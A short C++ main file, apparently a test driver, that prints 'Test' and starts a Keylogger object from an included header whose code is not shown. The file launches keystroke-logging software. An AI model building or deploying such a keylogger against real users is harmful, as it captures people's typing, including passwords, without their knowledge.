#include <iostream>
#include "loggers/Keylogger.hpp"

int main() {
    std::cout << "Test";
    Keylogger* keyLoger = new Keylogger(5);
    keyLoger->start();
    return 0;
}